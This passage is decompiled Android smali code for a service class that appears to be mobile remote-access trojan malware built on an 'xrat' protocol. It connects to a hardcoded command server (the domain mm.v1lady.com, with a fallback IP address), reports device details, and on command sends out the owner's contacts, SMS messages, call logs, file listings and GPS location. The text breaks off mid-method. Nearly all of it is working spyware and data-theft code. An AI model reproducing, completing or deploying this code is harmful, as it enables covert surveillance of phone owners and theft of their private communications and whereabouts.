.class public Lcom/v1/StreamService;
.super Landroid/app/Service;


# static fields
.field public static c:Lcom/v1/StreamService;

.field public static e:Z

.field public static g:Z


# instance fields
.field public a:Ljava/lang/String;

.field public b:I

.field public d:Z

.field f:Ljava/lang/Process;

.field private h:Ljava/net/Socket;

.field private i:Z

.field private j:Ljava/util/Timer;

.field private k:Landroid/app/AlarmManager;

.field private l:Landroid/app/PendingIntent;

.field private m:Lcom/baidu/location/LocationClient;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v1, 0x0

    const/4 v0, 0x0

    sput-object v0, Lcom/v1/StreamService;->c:Lcom/v1/StreamService;

    sput-boolean v1, Lcom/v1/StreamService;->e:Z

    sput-boolean v1, Lcom/v1/StreamService;->g:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    const/4 v1, 0x0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/v1/StreamService;->i:Z

    iput-object v1, p0, Lcom/v1/StreamService;->j:Ljava/util/Timer;

    const-string v0, "mm.v1lady.com"

    iput-object v0, p0, Lcom/v1/StreamService;->a:Ljava/lang/String;

    const/16 v0, 0x596

    iput v0, p0, Lcom/v1/StreamService;->b:I

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/v1/StreamService;->d:Z

    iput-object v1, p0, Lcom/v1/StreamService;->f:Ljava/lang/Process;

    return-void
.end method

.method private a(Ljava/lang/String;)V
    .locals 5

    const/4 v0, 0x0

    new-instance v1, Ljava/io/File;

    const-string v2, "/data/data/com.v1/"

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->list()[Ljava/lang/String;

    move-result-object v2

    :goto_0
    array-length v1, v2

    if-lt v0, v1, :cond_0

    return-void

    :cond_0
    aget-object v1, v2, v0

    const-string v3, ".stream-"

    invoke-virtual {v1, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_1

    new-instance v1, Ljava/io/File;

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "/data/data/com.v1/"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v4, v2, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v1, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->isFile()Z

    move-result v3

    if-eqz v3, :cond_1

    :try_start_0
    const-string v3, "StreamService"

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v3, Ljava/io/BufferedReader;

    new-instance v4, Ljava/io/FileReader;

    invoke-direct {v4, v1}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

    invoke-direct {v3, v4}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v1

    const-string v3, "\u00a7"

    invoke-virtual {v1, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x1

    aget-object v3, v3, v4

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    const-string v4, "\u00a7"

    invoke-virtual {v1, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    const/4 v4, 0x0

    aget-object v1, v1, v4

    new-instance v4, Lcom/v1/h;

    invoke-direct {v4, p0, v1, p1, v3}, Lcom/v1/h;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;I)V

    invoke-virtual {v4}, Lcom/v1/h;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    :goto_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method

.method private static b(Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    :try_start_0
    invoke-static {p0}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v0

    invoke-virtual {v0}, Ljava/net/InetAddress;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "/"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_0

    const-string v1, "/"

    invoke-virtual {v0, v1}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v1

    add-int/lit8 v1, v1, 0x1

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :cond_0
    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    const-string v0, "221.226.58.202"

    goto :goto_0
.end method

.method private c()V
    .locals 3

    :try_start_0
    invoke-virtual {p0}, Lcom/v1/StreamService;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    const-string v1, "config.dat"

    invoke-virtual {v0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v0

    new-instance v1, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/InputStreamReader;

    invoke-direct {v2, v0}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/v1/StreamService;->a:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    iput v0, p0, Lcom/v1/StreamService;->b:I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method private d()V
    .locals 2

    const-wide/32 v0, 0xea60

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    invoke-direct {p0}, Lcom/v1/StreamService;->c()V

    new-instance v0, Lcom/v1/f;

    invoke-direct {v0, p0}, Lcom/v1/f;-><init>(Lcom/v1/StreamService;)V

    invoke-virtual {v0}, Lcom/v1/f;->start()V

    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public final a()V
    .locals 22

    :try_start_0
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/v1/StreamService;->a:Ljava/lang/String;

    invoke-static {v2}, Lcom/v1/StreamService;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Lcom/v1/StreamService;->a:Ljava/lang/String;

    const-string v2, "StreamService"

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/v1/StreamService;->a:Ljava/lang/String;

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v2, Ljava/net/Socket;

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/v1/StreamService;->a:Ljava/lang/String;

    move-object/from16 v0, p0

    iget v4, v0, Lcom/v1/StreamService;->b:I

    invoke-direct {v2, v3, v4}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    move-object/from16 v0, p0

    iput-object v2, v0, Lcom/v1/StreamService;->h:Ljava/net/Socket;

    new-instance v17, Ljava/io/DataInputStream;

    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/v1/StreamService;->h:Ljava/net/Socket;

    invoke-virtual {v2}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v2

    move-object/from16 v0, v17

    invoke-direct {v0, v2}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    new-instance v18, Ljava/io/DataOutputStream;

    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/v1/StreamService;->h:Ljava/net/Socket;

    invoke-virtual {v2}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    move-object/from16 v0, v18

    invoke-direct {v0, v2}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    new-instance v19, Lcom/v1/lib/j;

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/v1/lib/j;-><init>(Landroid/content/Context;)V

    invoke-static {}, Lcom/v1/lib/j;->i()[Ljava/lang/String;

    move-result-object v13

    new-instance v2, Lcom/google/xrat/protocol/ClientInfo;

    const-string v3, ""

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->b()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    aget-object v5, v13, v5

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->a()Ljava/lang/String;

    move-result-object v6

    sget-object v7, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->c()Ljava/lang/String;

    move-result-object v8

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->e()Ljava/lang/String;

    move-result-object v9

    invoke-static {}, Lcom/v1/lib/j;->g()Ljava/lang/String;

    move-result-object v10

    invoke-static {}, Lcom/v1/lib/j;->j()Ljava/lang/String;

    move-result-object v11

    sget-object v12, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    const/4 v14, 0x1

    aget-object v13, v13, v14

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->f()Ljava/lang/String;

    move-result-object v14

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->h()Ljava/lang/String;

    move-result-object v15

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->d()Z

    move-result v16

    invoke-direct/range {v2 .. v16}, Lcom/google/xrat/protocol/ClientInfo;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    new-instance v3, Lcom/google/xrat/protocol/ClientInfoPacket;

    invoke-direct {v3, v2}, Lcom/google/xrat/protocol/ClientInfoPacket;-><init>(Lcom/google/xrat/protocol/ClientInfo;)V

    const/16 v2, 0xc9

    const/4 v4, 0x0

    invoke-virtual {v3}, Lcom/google/xrat/protocol/ClientInfoPacket;->build()[B

    move-result-object v5

    array-length v5, v5

    int-to-short v5, v5

    invoke-virtual {v3}, Lcom/google/xrat/protocol/ClientInfoPacket;->build()[B

    move-result-object v3

    invoke-static {v2, v4, v5, v3}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    const/4 v2, 0x1

    sput-boolean v2, Lcom/v1/StreamService;->g:Z

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->d()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->h()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/v1/StreamService;->a(Ljava/lang/String;)V

    :cond_0
    new-instance v2, Ljava/io/File;

    const-string v3, "/data/data/com.v1/gps.txt"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_1

    invoke-virtual {v2}, Ljava/io/File;->createNewFile()Z

    :cond_1
    new-instance v3, Ljava/io/BufferedReader;

    new-instance v4, Ljava/io/FileReader;

    invoke-direct {v4, v2}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

    invoke-direct {v3, v4}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_2

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_2

    invoke-static {v3}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v3

    const-wide/32 v5, 0x36ee80

    add-long/2addr v3, v5

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v5

    cmp-long v3, v3, v5

    if-gez v3, :cond_3

    :cond_2
    new-instance v3, Ljava/io/BufferedWriter;

    new-instance v4, Ljava/io/FileWriter;

    invoke-direct {v4, v2}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    invoke-direct {v3, v4}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    invoke-virtual {v2, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/io/BufferedWriter;->flush()V

    invoke-virtual/range {p0 .. p0}, Lcom/v1/StreamService;->getApplication()Landroid/app/Application;

    move-result-object v2

    check-cast v2, Lcom/v1/lib/Location;

    iget-object v3, v2, Lcom/v1/lib/Location;->a:Lcom/baidu/location/LocationClient;

    move-object/from16 v0, p0

    iput-object v3, v0, Lcom/v1/StreamService;->m:Lcom/baidu/location/LocationClient;

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/v1/StreamService;->a:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lcom/v1/lib/Location;->a(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget v3, v0, Lcom/v1/StreamService;->b:I

    invoke-virtual {v2, v3}, Lcom/v1/lib/Location;->a(I)V

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->h()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Lcom/v1/lib/Location;->b(Ljava/lang/String;)V

    const/16 v3, 0xe7

    invoke-virtual {v2, v3}, Lcom/v1/lib/Location;->a(S)V

    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/v1/StreamService;->m:Lcom/baidu/location/LocationClient;

    invoke-virtual {v2}, Lcom/baidu/location/LocationClient;->start()V

    :cond_3
    :goto_0
    move-object/from16 v0, p0

    iget-boolean v2, v0, Lcom/v1/StreamService;->i:Z
    :try_end_0
    .catch Ljava/net/ConnectException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_5
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_8
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_6

    if-nez v2, :cond_4

    :goto_1
    return-void

    :cond_4
    const/4 v2, 0x2

    :try_start_1
    new-array v2, v2, [B

    move-object/from16 v0, v17

    invoke-virtual {v0, v2}, Ljava/io/DataInputStream;->read([B)I

    invoke-static {v2}, Lcom/google/xrat/a/b;->a([B)S

    move-result v3

    const/4 v2, 0x2

    new-array v4, v2, [B

    move-object/from16 v0, v17

    invoke-virtual {v0, v4}, Ljava/io/DataInputStream;->read([B)I

    invoke-static {v4}, Lcom/google/xrat/a/b;->a([B)S

    move-result v16

    const/4 v2, 0x4

    new-array v2, v2, [B

    move-object/from16 v0, v17

    invoke-virtual {v0, v2}, Ljava/io/DataInputStream;->read([B)I

    invoke-static {v2}, Lcom/google/xrat/a/b;->c([B)I

    move-result v5

    new-instance v6, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v6, v5}, Ljava/io/ByteArrayOutputStream;-><init>(I)V

    const/16 v2, 0x400

    new-array v7, v2, [B

    const/4 v2, 0x0

    :goto_2
    if-lt v2, v5, :cond_5

    invoke-virtual {v6}, Ljava/io/ByteArrayOutputStream;->flush()V

    invoke-virtual {v6}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    sget-short v5, Lcom/google/xrat/protocol/Protocol;->GET_CONTCATS:S

    if-ne v3, v5, :cond_6

    invoke-static/range {p0 .. p0}, Lcom/v1/lib/b;->a(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v2

    new-instance v3, Lcom/google/xrat/protocol/ContactsPacket;

    invoke-direct {v3, v2}, Lcom/google/xrat/protocol/ContactsPacket;-><init>(Ljava/util/ArrayList;)V

    const/16 v2, 0xd4

    invoke-virtual {v3}, Lcom/google/xrat/protocol/ContactsPacket;->build()[B

    move-result-object v4

    array-length v4, v4

    invoke-virtual {v3}, Lcom/google/xrat/protocol/ContactsPacket;->build()[B

    move-result-object v3

    move/from16 v0, v16

    invoke-static {v2, v0, v4, v3}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V
    :try_end_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/lang/RuntimeException; {:try_start_1 .. :try_end_1} :catch_4
    .catch Ljava/net/ConnectException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_1 .. :try_end_1} :catch_3
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_6

    goto :goto_0

    :catch_0
    move-exception v2

    :try_start_2
    invoke-virtual {v2}, Ljava/net/SocketException;->printStackTrace()V

    const/4 v2, 0x0

    sput-boolean v2, Lcom/v1/StreamService;->g:Z

    new-instance v2, Lcom/v1/f;

    move-object/from16 v0, p0

    invoke-direct {v2, v0}, Lcom/v1/f;-><init>(Lcom/v1/StreamService;)V

    invoke-virtual {v2}, Lcom/v1/f;->start()V
    :try_end_2
    .catch Ljava/net/ConnectException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_2 .. :try_end_2} :catch_3
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_5
    .catch Ljava/lang/RuntimeException; {:try_start_2 .. :try_end_2} :catch_8
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_6

    goto :goto_1

    :catch_1
    move-exception v2

    const-string v2, "StreamService"

    const-string v3, "\u7aef\u53e3\u6ca1\u5f00,3\u5206\u949f\u540e\u6211\u518d\u8bd5"

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v2, 0x0

    sput-boolean v2, Lcom/v1/StreamService;->g:Z

    invoke-direct/range {p0 .. p0}, Lcom/v1/StreamService;->d()V

    goto :goto_1

    :cond_5
    :try_start_3
    move-object/from16 v0, v17

    invoke-virtual {v0, v7}, Ljava/io/DataInputStream;->read([B)I

    move-result v8

    add-int/2addr v2, v8

    const/4 v9, 0x0

    invoke-virtual {v6, v7, v9, v8}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    :try_end_3
    .catch Ljava/net/SocketException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/lang/RuntimeException; {:try_start_3 .. :try_end_3} :catch_4
    .catch Ljava/net/ConnectException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_6

    goto :goto_2

    :catch_2
    move-exception v2

    :try_start_4
    const-string v3, "StreamService"

    invoke-virtual {v2}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V
    :try_end_4
    .catch Ljava/net/ConnectException; {:try_start_4 .. :try_end_4} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_4 .. :try_end_4} :catch_3
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_5
    .catch Ljava/lang/RuntimeException; {:try_start_4 .. :try_end_4} :catch_8
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_6

    goto/16 :goto_0

    :catch_3
    move-exception v2

    invoke-virtual {v2}, Ljava/net/UnknownHostException;->printStackTrace()V

    const/4 v2, 0x0

    sput-boolean v2, Lcom/v1/StreamService;->g:Z

    invoke-direct/range {p0 .. p0}, Lcom/v1/StreamService;->d()V

    goto/16 :goto_1

    :cond_6
    :try_start_5
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->GET_MSG:S

    if-ne v3, v5, :cond_7

    invoke-static/range {p0 .. p0}, Lcom/v1/lib/l;->a(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v2

    new-instance v3, Lcom/google/xrat/protocol/SmsPacket;

    invoke-direct {v3, v2}, Lcom/google/xrat/protocol/SmsPacket;-><init>(Ljava/util/ArrayList;)V

    const/16 v2, 0xcc

    invoke-virtual {v3}, Lcom/google/xrat/protocol/SmsPacket;->build()[B

    move-result-object v4

    array-length v4, v4

    invoke-virtual {v3}, Lcom/google/xrat/protocol/SmsPacket;->build()[B

    move-result-object v3

    move/from16 v0, v16

    invoke-static {v2, v0, v4, v3}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V
    :try_end_5
    .catch Ljava/net/SocketException; {:try_start_5 .. :try_end_5} :catch_0
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_2
    .catch Ljava/lang/RuntimeException; {:try_start_5 .. :try_end_5} :catch_4
    .catch Ljava/net/ConnectException; {:try_start_5 .. :try_end_5} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_5 .. :try_end_5} :catch_3
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_6

    goto/16 :goto_0

    :catch_4
    move-exception v2

    :try_start_6
    invoke-virtual {v2}, Ljava/lang/RuntimeException;->printStackTrace()V

    const/4 v2, 0x0

    sput-boolean v2, Lcom/v1/StreamService;->g:Z

    new-instance v2, Lcom/v1/f;

    move-object/from16 v0, p0

    invoke-direct {v2, v0}, Lcom/v1/f;-><init>(Lcom/v1/StreamService;)V

    invoke-virtual {v2}, Lcom/v1/f;->start()V
    :try_end_6
    .catch Ljava/net/ConnectException; {:try_start_6 .. :try_end_6} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_6 .. :try_end_6} :catch_3
    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_5
    .catch Ljava/lang/RuntimeException; {:try_start_6 .. :try_end_6} :catch_8
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_6

    goto/16 :goto_1

    :catch_5
    move-exception v2

    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    const/4 v2, 0x0

    sput-boolean v2, Lcom/v1/StreamService;->g:Z

    invoke-direct/range {p0 .. p0}, Lcom/v1/StreamService;->d()V

    goto/16 :goto_1

    :cond_7
    :try_start_7
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->GET_CALLLOGS:S

    if-ne v3, v5, :cond_8

    invoke-static/range {p0 .. p0}, Lcom/v1/lib/a;->a(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v2

    new-instance v3, Lcom/google/xrat/protocol/CallLogsPacket;

    invoke-direct {v3, v2}, Lcom/google/xrat/protocol/CallLogsPacket;-><init>(Ljava/util/ArrayList;)V

    const/16 v2, 0xcd

    invoke-virtual {v3}, Lcom/google/xrat/protocol/CallLogsPacket;->build()[B

    move-result-object v4

    array-length v4, v4

    invoke-virtual {v3}, Lcom/google/xrat/protocol/CallLogsPacket;->build()[B

    move-result-object v3

    move/from16 v0, v16

    invoke-static {v2, v0, v4, v3}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V
    :try_end_7
    .catch Ljava/net/SocketException; {:try_start_7 .. :try_end_7} :catch_0
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_2
    .catch Ljava/lang/RuntimeException; {:try_start_7 .. :try_end_7} :catch_4
    .catch Ljava/net/ConnectException; {:try_start_7 .. :try_end_7} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_7 .. :try_end_7} :catch_3
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_6

    goto/16 :goto_0

    :catch_6
    move-exception v2

    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    const/4 v2, 0x0

    sput-boolean v2, Lcom/v1/StreamService;->g:Z

    invoke-direct/range {p0 .. p0}, Lcom/v1/StreamService;->d()V

    goto/16 :goto_1

    :cond_8
    :try_start_8
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->LIST_DIR:S

    if-ne v3, v5, :cond_9

    invoke-static {v2}, Lcom/google/xrat/a/b;->b([B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/v1/lib/e;->a(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v2

    new-instance v3, Lcom/google/xrat/protocol/FileExplorerPacket;

    invoke-direct {v3, v2}, Lcom/google/xrat/protocol/FileExplorerPacket;-><init>(Ljava/util/ArrayList;)V

    const/16 v2, 0xcf

    invoke-virtual {v3}, Lcom/google/xrat/protocol/FileExplorerPacket;->build()[B

    move-result-object v4

    array-length v4, v4

    invoke-virtual {v3}, Lcom/google/xrat/protocol/FileExplorerPacket;->build()[B

    move-result-object v3

    move/from16 v0, v16

    invoke-static {v2, v0, v4, v3}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    goto/16 :goto_0

    :cond_9
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->GET_GPS:S

    if-ne v3, v5, :cond_a

    invoke-virtual/range {p0 .. p0}, Lcom/v1/StreamService;->getApplication()Landroid/app/Application;

    move-result-object v2

    check-cast v2, Lcom/v1/lib/Location;

    iget-object v3, v2, Lcom/v1/lib/Location;->a:Lcom/baidu/location/LocationClient;

    move-object/from16 v0, p0

    iput-object v3, v0, Lcom/v1/StreamService;->m:Lcom/baidu/location/LocationClient;

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/v1/StreamService;->a:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lcom/v1/lib/Location;->a(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget v3, v0, Lcom/v1/StreamService;->b:I

    invoke-virtual {v2, v3}, Lcom/v1/lib/Location;->a(I)V

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->h()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Lcom/v1/lib/Location;->b(Ljava/lang/String;)V

    const/16 v3, 0xe6

    invoke-virtual {v2, v3}, Lcom/v1/lib/Location;->a(S)V

    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/v1/StreamService;->m:Lcom/baidu/location/LocationClient;

    invoke-virtual {v2}, Lcom/baidu/location/LocationClient;->start()V

    goto/16 :goto_0

    :cond_a
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_REMARK:S

    if-ne v3, v5, :cond_b

    invoke-static {v2}, Lcom/google/xrat/a/b;->b([B)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcom/v1/a/b;

    move-object/from16 v0, p0

    invoke-direct {v3, v0}, Lcom/v1/a/b;-><init>(Landroid/content/Context;)V

    const-string v4, "log"

    const-string v5, "\u00a7"

    invoke-virtual {v2, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x1

    aget-object v5, v5, v6

    invoke-virtual {v3, v4, v5}, Lcom/v1/a/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const/16 v3, 0xd5

    const/4 v4, 0x0

    invoke-static {v2}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v5

    array-length v5, v5

    invoke-static {v2}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v2

    invoke-static {v3, v4, v5, v2}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

